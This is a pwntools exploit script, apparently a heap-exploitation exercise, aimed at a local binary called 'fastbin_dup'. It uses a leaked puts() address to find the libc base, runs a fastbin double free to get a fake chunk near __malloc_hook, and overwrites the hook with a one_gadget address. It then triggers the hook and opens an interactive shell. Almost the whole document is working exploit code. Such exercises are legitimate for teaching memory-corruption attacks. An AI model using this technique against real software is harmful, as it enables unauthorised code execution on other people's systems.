#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
username = p64(0) + p64(0x31) # this represents a fake size so it looks like a heap chunk
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b"A"*0x68)
chunk_B = malloc(0x68, b"B"*0x68)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# 0x7ffff7dd0b50 - 0x7ffff7dd0b2d = 35
distance_bw_func_N_fakeChunk = 35
dup = malloc(0x68,
             p64(libc.sym.__malloc_hook - distance_bw_func_N_fakeChunk)
            ) # malloc treats chunk as start 16 bytes before userdata


malloc(0x68, "Y")
malloc(0x68, "Z") # remember that fastbin will store address in chunk before putting data in
                  #  otherwise this would overwrite the address cause the address is stored
                  #  right after the size field when this chunk is considered free

# add 19 bytes of garbage to align the chunk
#malloc(0x68, b"Y"*19 + p64(libc.sym.system)) # this should now overwrite user data's `target` field

#this is to hlep me keep track
malloc(0x68, b"ABCDEFGHIJKLMNOPQRS" + p64(libc.address+ 0xe1fa1)) # this should now overwrite user data's `target` field

#This should trigger the malloc_hook
malloc(1, "")

# =============================================================================

io.interactive()
